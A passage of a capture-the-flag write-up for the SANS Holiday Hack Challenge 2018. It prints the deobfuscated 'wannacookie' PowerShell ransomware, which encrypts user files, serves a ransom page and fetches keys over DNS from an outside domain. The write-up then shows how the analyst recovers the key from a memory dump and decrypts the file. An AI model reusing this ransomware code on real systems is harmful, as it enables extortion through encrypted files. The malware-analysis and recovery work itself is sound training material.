+  <span class="hljs-variable">$d_t</span> = (($(<span class="hljs-built_in">Get-Date</span>).ToUniversalTime() | <span class="hljs-built_in">Out-String</span>) <span class="hljs-nomarkup">-replace</span> <span class="hljs-string">"`r`n"</span>);
+  [array]<span class="hljs-variable">$f_c</span> = $(<span class="hljs-built_in">Get-ChildItem</span> *.elfdb -Exclude *.wannacookie -Path $($(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Desktop'</span>),$(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Documents'</span>),$(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Videos'</span>),$(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Pictures'</span>),$(<span class="hljs-variable">$env:userprofile</span>+<span class="hljs-string">'\Music'</span>)) -Recurse | where { ! <span class="hljs-variable">$_</span>.PSIsContainer } | <span class="hljs-built_in">Foreach-Object</span> {<span class="hljs-variable">$_</span>.Fullname});
+  e_n_d <span class="hljs-variable">$b_k</span> <span class="hljs-variable">$f_c</span> <span class="hljs-literal">$true</span>;
+  <span class="hljs-built_in">Clear-variable</span> -Name <span class="hljs-string">"h_k"</span>;
+  <span class="hljs-built_in">Clear-variable</span> -Name <span class="hljs-string">"b_k"</span>;
+  <span class="hljs-variable">$lurl</span> = <span class="hljs-string">'http://127.0.0.1:8080/'</span>;
+  <span class="hljs-variable">$html_c</span> = @{<span class="hljs-string">'GET /'</span>  =  $(g_o_dns (A2H <span class="hljs-string">"source.min.html"</span>));
+  <span class="hljs-string">'GET /close'</span>  =  <span class="hljs-string">'&lt;p&gt;Bye!&lt;/p&gt;'</span>};
+  <span class="hljs-built_in">Start-Job</span> -ScriptBlock{<span class="hljs-keyword">param</span>(<span class="hljs-variable">$url</span>);
+  <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-number">10</span>;
+  <span class="hljs-built_in">Add-type</span> -AssemblyName System.Windows.Forms;
+  <span class="hljs-built_in">start-process</span> <span class="hljs-string">"<span class="hljs-variable">$url</span>"</span> -WindowStyle Maximized;
+  <span class="hljs-built_in">Start-sleep</span> <span class="hljs-number">2</span>;
+  [System.Windows.Forms.SendKeys]::SendWait(<span class="hljs-string">"{F11}"</span>)} -Arg <span class="hljs-variable">$lurl</span>;
+  <span class="hljs-variable">$list</span> = <span class="hljs-built_in">New-Object</span> System.Net.HttpListener;
+  <span class="hljs-variable">$list</span>.Prefixes.Add(<span class="hljs-variable">$lurl</span>);
+  <span class="hljs-variable">$list</span>.Start();
+  <span class="hljs-keyword">try</span> {
+    <span class="hljs-variable">$close</span> = <span class="hljs-literal">$false</span>;
+    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$list</span>.IsListening) {
+      <span class="hljs-variable">$context</span> = <span class="hljs-variable">$list</span>.GetContext();
+      <span class="hljs-variable">$Req</span> = <span class="hljs-variable">$context</span>.Request;
+      <span class="hljs-variable">$Resp</span> = <span class="hljs-variable">$context</span>.Response;
+      <span class="hljs-variable">$recvd</span> = <span class="hljs-string">'{0} {1}'</span> -f <span class="hljs-variable">$Req</span>.httpmethod, <span class="hljs-variable">$Req</span>.url.localpath;
+      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$recvd</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">'GET /'</span>) {
+        <span class="hljs-variable">$html</span> = <span class="hljs-variable">$html_c</span>[<span class="hljs-variable">$recvd</span>]
+      } <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$recvd</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">'GET /decrypt'</span>) {
+        <span class="hljs-variable">$akey</span> = <span class="hljs-variable">$Req</span>.QueryString.Item(<span class="hljs-string">"key"</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$k_h</span> <span class="hljs-nomarkup">-eq</span> $(sh1 <span class="hljs-variable">$akey</span>)) {
+          <span class="hljs-variable">$akey</span> = $(H2B <span class="hljs-variable">$akey</span>);
+          [array]<span class="hljs-variable">$f_c</span> = $(<span class="hljs-built_in">Get-ChildItem</span> -Path $(<span class="hljs-variable">$env:userprofile</span>) -Recurse  -Filter *.wannacookie | where { ! <span class="hljs-variable">$_</span>.PSIsContainer } | <span class="hljs-built_in">Foreach-Object</span> {<span class="hljs-variable">$_</span>.Fullname});
+          e_n_d <span class="hljs-variable">$akey</span> <span class="hljs-variable">$f_c</span> <span class="hljs-literal">$false</span>;
+          <span class="hljs-variable">$html</span> = <span class="hljs-string">"Files have been decrypted!"</span>;
+          <span class="hljs-variable">$close</span> = <span class="hljs-literal">$true</span>
+        } <span class="hljs-keyword">else</span> {
+          <span class="hljs-variable">$html</span> = <span class="hljs-string">"Invalid Key!"</span>
+        }
+      } <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$recvd</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">'GET /close'</span>) {<span class="hljs-variable">$close</span> = <span class="hljs-literal">$true</span>;
+      <span class="hljs-variable">$html</span> = <span class="hljs-variable">$html_c</span>[<span class="hljs-variable">$recvd</span>]} <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$recvd</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-string">'GET /cookie_is_paid'</span>) {<span class="hljs-variable">$c_n_k</span> = $(Resolve-DnsName -Server erohetfanu.com -Name (<span class="hljs-string">"<span class="hljs-variable">$c_id</span>.72616e736f6d697370616964.erohetfanu.com"</span>.trim()) -Type TXT).Strings;
+      <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$c_n_k</span>.length <span class="hljs-nomarkup">-eq</span> <span class="hljs-number">32</span> ) {<span class="hljs-variable">$html</span> = <span class="hljs-variable">$c_n_k</span>} <span class="hljs-keyword">else</span> {<span class="hljs-variable">$html</span> = <span class="hljs-string">"UNPAID|<span class="hljs-variable">$c_id</span>|<span class="hljs-variable">$d_t</span>"</span>}} <span class="hljs-keyword">else</span> {<span class="hljs-variable">$Resp</span>.statuscode = <span class="hljs-number">404</span>;
+      <span class="hljs-variable">$html</span> = <span class="hljs-string">'&lt;h1&gt;404 Not Found&lt;/h1&gt;'</span>};
+      <span class="hljs-variable">$buffer</span> = [Text.Encoding]::UTF8.GetBytes(<span class="hljs-variable">$html</span>);
+      <span class="hljs-variable">$Resp</span>.ContentLength64 = <span class="hljs-variable">$buffer</span>.length;
+      <span class="hljs-variable">$Resp</span>.OutputStream.Write(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$buffer</span>.length);
+      <span class="hljs-variable">$Resp</span>.Close();
+      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$close</span>) {
+        <span class="hljs-variable">$list</span>.Stop();
+        <span class="hljs-keyword">return</span>
+      }
+    }
+  } 
+  <span class="hljs-keyword">finally</span> {<span class="hljs-variable">$list</span>.Stop()}
+};
+
+wanc;
+</div></code></pre>
+<p>By looking at the head sequence of the <code>wanc</code> function, if you succeed in the DNS query of <code>a specific domain</code>, the <code>return</code> is executed and the process is terminated.</p>
+<pre class="hljs"><code><div>  <span class="hljs-variable">$S1</span> = <span class="hljs-string">"1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000"</span>;
+  <span class="hljs-keyword">if</span> (<span class="hljs-literal">$null</span> <span class="hljs-nomarkup">-ne</span> ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B <span class="hljs-variable">$S1</span>))) $(Resolve-DnsName -Server erohetfanu.com -Name <span class="hljs-number">6</span>B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction <span class="hljs-number">0</span> -Server <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>))) {<span class="hljs-keyword">return</span>};
+</div></code></pre>
+<p>So kill switch domain is <code>$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))</code>.</p>
+<pre class="hljs"><code><div>PS C:\&gt; $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
+yippeekiyaa.aaay
+</div></code></pre>
+<p>Running the script will get the following domain.</p>
+<p><code>yippeekiyaa.aaay</code></p>
+<h4 id="9-4-recover-alabasters-password">9-4 : Recover Alabaster's Password</h4>
+<p><code>After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?</code></p>
+<p>Alabaster supported me to download zip archive from https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip .
+A process dump and an encrypted elfdb file were stored in the zip archive.</p>
+<pre class="hljs"><code><div>root@kali~/work# wget -q https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip
+
+root@kali~/work# unzip forensic_artifacts.zip 
+Archive:  forensic_artifacts.zip
+ extracting: alabaster_passwords.elfdb.wannacookie  
+  inflating: powershell.exe_181109_104716.dmp  
+</div></code></pre>
+<p>Read malware code and list some features.</p>
+<ul>
+<li>If yippeekiyaa.aaay DNS query succeeds, it will not infect</li>
+<li>It does not infect unless the terminal belongs to the KRINGLECASTLE domain</li>
+<li>The file to be encrypted is the file * .elfdb (excluding * .wannacookie) in Desktop, Documents, Videos, Pictures, Music under USERPROFILE</li>
+<li>The first 4 bytes of the encrypted file is the length of the initial vector used for AES encryption.</li>
+<li>Continuously, a initial vector is allocated for the specified length.</li>
+<li>The key of AES is 16 bytes (128 bit).</li>
+<li>The file is encrypted in CBC mode.</li>
+<li>The AES key can not be found from the process dump because it is cleared from the memory when the encryption is completed.</li>
+<li>However, the AES key is encrypted with the public key, and the encrypted data remains in the memory.</li>
+<li>Therefore, if I can obtain the secret key for the public key, I can obtain the key of AES.</li>
+</ul>
+<p>First, search for a secret key corresponding to the public key.
+Quote a few lines from the <code>wanc</code> function.</p>
+<pre class="hljs"><code><div>  <span class="hljs-variable">$b_k</span> = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>) + ([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>)) + <span class="hljs-number">0</span>..<span class="hljs-number">9</span> | sort {<span class="hljs-built_in">Get-Random</span>})[<span class="hljs-number">0</span>..<span class="hljs-number">15</span>] -join <span class="hljs-string">''</span>))  | ? {<span class="hljs-variable">$_</span> <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span>x00});
+  <span class="hljs-variable">$p_k</span> = [System.Convert]::FromBase64String($(g_o_dns(<span class="hljs-string">"7365727665722E637274"</span>) ) );
+  <span class="hljs-variable">$p_k_e_k</span> = (p_k_e <span class="hljs-variable">$b_k</span> <span class="hljs-variable">$p_k</span>).ToString();
+</div></code></pre>
+<ul>
+<li>$b_k : AES encryption key (Generated from random numbers for each execution)</li>
+<li>$p_k : X509 certificate including public key</li>
+<li>$p_k_e_k : An AES encryption key encrypted with a public key</li>
+</ul>
+<p>The public key is the base64 decoded return value of <code>g_o_dns(&quot;7365727665722E637274&quot;)</code>.
+Decoding <code>7365727665722E637274</code> as hexadecimal means <code>server.crt</code></p>
+<pre class="hljs"><code><div>root@kali~/work# echo -n &quot;7365727665722E637274&quot; | xxd -r -p
+server.crt
+</div></code></pre>
+<p>In general, the secret key is often stored as <code>server.key</code>.
+<code>server.key</code> becomes <code>7365727665722E6B6579</code> in hexadecimal.</p>
+<pre class="hljs"><code><div>root@kali~/work# echo -n server.key | xxd -p -u
+7365727665722E6B6579
+</div></code></pre>
+<p>I tried calling <code>g_o_dns(&quot;7365727665722E6B6579&quot;)</code> function, and as a result I got the secret key!</p>
+<pre class="hljs"><code><div>PS C:\&gt; g_o_dns(&quot;7365727665722E6B6579&quot;)
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
+L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
+W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
+jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
+TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
+HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
+tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
+0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
+OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
+6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
+3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
+Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
+uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
+Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
+4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
+0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
+/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
+8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
+KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
+eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
+sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
+moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
+DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
+Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
+JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
+UdrzXvSwyFuuIqBlkHnWSIeC
+-----END PRIVATE KEY-----
+</div></code></pre>
+<p>Next I find <code>$p_k_e_k</code> from the process dump using power_dump.
+Consider a regular expression for searching <code>$p_k_e_k</code>.
+Run the script and see the contents of the variable.</p>
+<pre class="hljs"><code><div>PS C:\&gt; <span class="hljs-variable">$p_k</span> = [System.Convert]::FromBase64String($(g_o_dns(<span class="hljs-string">"7365727665722E637274"</span>) ) );
+
+PS C:\&gt; <span class="hljs-variable">$b_k</span> = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>) + ([char[]]([char]<span class="hljs-number">01</span>..[char]<span class="hljs-number">255</span>)) + <span class="hljs-number">0</span>..<span class="hljs-number">9</span> | sort {<span class="hljs-built_in">Get-Random</span>})[<span class="hljs-number">0</span>..<span class="hljs-number">15</span>] -join <span class="hljs-string">''</span>))  | ? {<span class="hljs-variable">$_</span> <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span>x00});
+
+PS C:\&gt; <span class="hljs-variable">$p_k_e_k</span> = (p_k_e <span class="hljs-variable">$b_k</span> <span class="hljs-variable">$p_k</span>).ToString();
+
+PS C:\&gt; <span class="hljs-variable">$p_k_e_k</span>
+<span class="hljs-number">30</span>ecfcfe3176e0c1075eb6a3680ab3f91e2b98b3fbe0b51beb7aec2fb0c5711e62791c83985d667c8a902628ffae98a58e9fcd40202fba0b94c4decb26df438a77151dfd9282f9dc8c8031a5364a2e5b29bf628fc625173bcddb2bb4a983b48eecce2df1fd5371acd2aac06545251e245bdaa5d811b1957cb50a4626eeae03387fbf7c4868c4374e40370bb76669bb78fc68cf91ccc4f7101f82fd6b575896622b10f20035a26b0190a46a0f736c89a8ac0afafb4d91e4b7dfbdd9ebca644f044b9e27897146b4496bad2fb7e78ad3dfc6b248e0ff0fc1808707ae6a007213b6c71741e307a794c44b168db47643c849ce6f9875b888414c4b2cec454b613e15
+
+PS C:\&gt; <span class="hljs-variable">$p_k_e_k</span>.Length
+<span class="hljs-number">512</span>
+</div></code></pre>
+<p>Therefore, <code>$p_k_e_k</code> can be expressed as <code>[0-9a-f]{512}</code> when written in regular expression.
+Find <code>$p_k_e_k</code> when malware runs from process dump with <code>power_dump</code>.</p>
+<pre class="hljs"><code><div>root@kali~/work# python power_dump.py
+...(snip)...
+
+============ Main Menu ================
+Memory Dump: powershell.exe_181109_104716.dmp
+Loaded     : True
+Processed  : True
+=======================================
+1. Load PowerShell Memory Dump File
+2. Process PowerShell Memory Dump
+3. Search/Dump Powershell Scripts
+4. Search/Dump Stored PS Variables
+e. Exit
+: 4
+
+[i] 10947 powershell Variable Values found!
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation                     
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches &quot;[python_regex]&quot;    | match python regex inside quotes
+len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size  
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: matches &quot;^[0-9a-f]{512}$&quot;
+
+================ Filters ================
+1| MATCHES  bool(re.search(r&quot;^[0-9a-f]{512}$&quot;,variable_values)) 
+
+[i] 1 powershell Variable Values found!
+============== Search/Dump PS Variable Values ===================================
+COMMAND        |     ARGUMENT                | Explanation                     
+===============|=============================|=================================
+print          | print [all|num]             | print specific or all Variables
+dump           | dump [all|num]              | dump specific or all Variables
+contains       | contains [ascii_string]     | Variable Values must contain string
+matches        | matches &quot;[python_regex]&quot;    | match python regex inside quotes
+len            | len [&gt;|&lt;|&gt;=|&lt;=|==] [bt_size]| Variables length &gt;,&lt;,=,&gt;=,&lt;= size  
+clear          | clear [all|num]             | clear all or specific filter num
+===============================================================================
+: print
+3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
+</div></code></pre>
+<p>As a result, I can probably guess that <code>$p_k_e_k</code> is <code>3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</code>.</p>
+<p>Next, decrypt <code>$p_k_e_k</code> with the previously obtained <code>server.key</code>, and get the 16-byte AES encryption key.</p>
+<pre class="hljs"><code><div>root@kali~/work# echo 3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971 | xxd -r -p &gt; cipher.bin
+
+root@kali~/work# openssl rsautl -decrypt -inkey server.key -in cipher.bin -oaep | hexdump -C
+00000000  fb cf c1 21 91 5d 99 cc  20 a3 d3 d5 d8 4f 83 08  |...!.].. ....O..|
+00000010
+</div></code></pre>
+<p>The encryption key of AES is <code>fbcfc121915d99cc20a3d3d5d84f8308</code>.
+Finally decrypt the <code>alabaster_passwords.elfdb.wannacookie</code>.</p>
+<p>The AES IV is stored at the beginning of the ABC file.
+<code>Length of IV</code>  is 0x00000010 bytes(16 bytes)
+<code>IV</code> is <code>1f98ac13b187f791ab42b24bcd7fed55</code>
+<code>Encrypted Data</code> is <code>f1307a23....</code>.</p>
+<pre class="hljs"><code><div>root@kali~/work# hexdump -C alabaster_passwords.elfdb.wannacookie | head -n 3
+00000000  10 00 00 00 1f 98 ac 13  b1 87 f7 91 ab 42 b2 4b  |.............B.K|
+00000010  cd 7f ed 55 f1 30 7a 23  5b f9 e9 08 8a 33 80 db  |...U.0z#[....3..|
+00000020  2c 87 c4 de 3b 43 6d a8  df e5 af 73 49 f7 00 3d  |,...;Cm....sI..=|
+</div></code></pre>
+<p>Decrypt <code>alabaster_passwords.elfdb.wannacookie</code> with python script.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+
+f   = open(<span class="hljs-string">"alabaster_passwords.elfdb.wannacookie"</span>, <span class="hljs-string">"rb"</span>).read()
+out = open(<span class="hljs-string">"alabaster_passwords.elfdb"</span>, <span class="hljs-string">"wb"</span>)
+
+key = <span class="hljs-string">"\xfb\xcf\xc1\x21\x91\x5d\x99\xcc\x20\xa3\xd3\xd5\xd8\x4f\x83\x08"</span>
+
+iv = f[<span class="hljs-number">4</span>:<span class="hljs-number">20</span>]
+enc = f[<span class="hljs-number">20</span>:]
+
+aes = AES.new(key, AES.MODE_CBC, iv)
+dec = aes.decrypt(enc)
+
+out.write(dec)
+out.close()
+</div></code></pre>
+<pre class="hljs"><code><div>root@kali~/work# python 0904_decrypt_wannacookie.py
+
+root@kali~/work# file alabaster_passwords.elfdb
+alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002
+
+root@kali~/work# sqlite3 alabaster_passwords.elfdb
+SQLite version 3.26.0 2018-12-01 12:34:55
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .tables
+passwords
+sqlite&gt; .schema passwords
+CREATE TABLE IF NOT EXISTS &quot;passwords&quot; (
+        `name`  TEXT NOT NULL,
+        `password`      TEXT NOT NULL,
+        `usedfor`       TEXT NOT NULL
+);
+sqlite&gt; select * from passwords;
+alabaster.snowball|CookiesR0cK!2!#|active directory
+alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com
+alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com
+alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner
+alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault
+alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com
+alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com
+alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org
+alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com
+</div></code></pre>
+<p>The password is <code>ED#ED#EED#EF#G#F#G#ABA#BA#B</code> for the Vault entry.</p>
+<h3 id="10-who-is-behind-it-all">10 : Who Is Behind It All?</h3>
+<p><code>Who was the mastermind behind the whole KringleCon plan?</code></p>
+<p>In order to obtain this answer it is necessary to solve the challenge of Pianolock and open the door.</p>
+<h4 id="pianolock">Pianolock</h4>
+<p><code>Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door?</code></p>
+<img src=img/10-01_Pianolock.PNG width=500px />
+<p>I tried <code>ED#ED#EED#EF#G#F#G#ABA#BA#B</code> which is answer of the previous problem.</p>
+<img src=img/10-02_ans09.PNG width=500px />
+<p>But the key isn't right.</p>
+<blockquote>
+<p>Hint: Alabaster said &quot;<code>Really, it's Mozart. And it should be in the key of D, not E.</code>&quot;.</p>
+</blockquote>
+<p>I tried to down a whole step from E to D.
+<code>DC#DC#DDC#DEF#EF#GAG#AG#A</code></p>
+<p>As a result, I got the message <code>You have unlocked Santa's vault!</code> and the door opened.</p>
+<h4 id="in-santas-vault">In Santa's vault</h4>
+<p>Santa said <code>I came up with the idea of KringleCon to find someone like you who could help me defend the North Pole against even the craftiest attackers.</code></p>
+<p>So the mastermind behind the whole KringleCon plan is <code>Santa</code>.</p>
+
+</body>
+</html>
